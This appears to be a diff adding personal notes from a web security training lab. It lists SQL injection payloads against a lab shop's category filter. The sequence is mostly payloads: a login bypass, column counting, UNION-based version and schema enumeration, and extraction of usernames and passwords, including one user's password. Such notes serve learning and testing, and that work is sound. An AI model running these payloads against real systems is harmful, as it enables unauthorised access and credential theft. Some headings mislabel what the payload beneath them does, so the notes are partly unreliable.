@@ -1,0 +1,28 @@
+https://0a6700d904bb77edc054d2f8002a00f4.web-security-academy.net/filter?category=Gifts
+
+LOGIN BYPASS
+' OR 1=1--
+
+LISTING THE DATABASES
+'+order+by+2--
+
+CHECKING VULNARABILITY
+'+union+select+NULL,NULL--
+
+VERSION
+'+union+select+'a',version()--
+
+RETRIVING THE DATA
+'+union+select+table_name,'a'+from+information_schema.tables--
+
+SELECTING DATA
+'+union+select+column_name,NULL+from+information_schema.columns+where+table_name='users'--
+
+data usernames
+'+union+select+username,NULL+from+users--
+
+database passwords
+'+union+select+password,NULL+from+users--
+
+particular username
+'+union+select+password,NULL+from+users+where+username='carlos'--
